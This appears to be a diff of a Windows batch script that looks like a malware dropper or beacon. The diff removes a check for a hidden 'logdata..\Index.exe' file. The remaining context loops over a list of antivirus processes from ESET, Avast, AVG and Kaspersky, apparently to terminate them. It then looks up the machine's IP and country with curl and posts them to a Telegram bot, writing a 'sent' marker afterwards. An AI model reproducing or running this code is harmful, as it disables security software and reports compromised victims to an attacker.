@@ -1,9 +1,4 @@
 setlocal EnableDelayedExpansion
-if exist "%ProgramData%\logdata..\Index.exe" (
-    del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
-    exit /b
-)
-
 set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"
 
 for %a in (%processList%) do (
@@ -33,3 +28,4 @@ for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-ap
 %WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=TRF1%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
 echo done > "%ProgramData%\sent"
 endlocal
+
